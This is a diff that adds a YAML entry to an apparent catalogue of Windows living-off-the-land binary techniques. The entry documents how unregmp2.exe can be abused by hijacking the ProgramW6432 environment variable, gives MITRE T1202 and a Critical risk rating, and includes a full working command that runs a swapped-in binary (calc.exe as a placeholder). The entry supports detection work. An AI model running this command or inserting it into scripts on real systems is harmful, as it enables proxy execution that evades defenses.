@@ -1,0 +1,19 @@
+- command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
+  description: Abuse unregmp2.exe to copy a binary into a controlled directory, modify %ProgramW6432% ENVVAR to point to the directory then execute unregmp2 with argument /HideWMP which will spawn a process at the hijacked path - '%ProgramW6432%\wmpnscfg.exe'.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/
+  risk: Critical
+  risk_reason: Use of this binary with any other arguments is extremely suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior will be extremely rare in all organizations.
+  tool: Unregmp2
+  threatactors:
+    N/A:
+      - N/A
